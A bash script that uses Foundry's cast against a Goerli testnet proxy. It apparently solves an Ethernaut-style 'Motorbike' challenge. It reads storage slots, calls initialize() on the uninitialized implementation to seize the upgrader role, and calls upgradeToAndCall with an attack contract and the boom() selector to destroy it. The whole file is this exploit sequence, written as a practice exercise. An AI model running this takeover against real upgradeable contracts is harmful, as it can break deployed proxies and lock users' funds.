set -o allexport
source ./.env
source ./.env_public
set +o allexport

echo "Proxy upgrader: "
cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $PROXY  0
    
echo "Proxy horsePower: "
cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $PROXY  1

echo "Proxy Implementation address: "
cast impl \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $PROXY

echo 
echo "Implementation upgrader: "
cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $IMPL  0
    
echo "Implementation horsePower: "
cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $IMPL  1

echo 
echo "boom() signature: "
cast calldata "boom()"

echo 
echo "Initializing Implementation contract..."
cast send $IMPL \
    "initialize()" \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3

echo "Implementation upgrader: "
cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $IMPL  0
    
echo "Implementation horsePower: "
cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $IMPL  1



cast send $IMPL \
    "upgradeToAndCall(address,bytes)" \
    $ATTACK 0xa169ce09 \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3
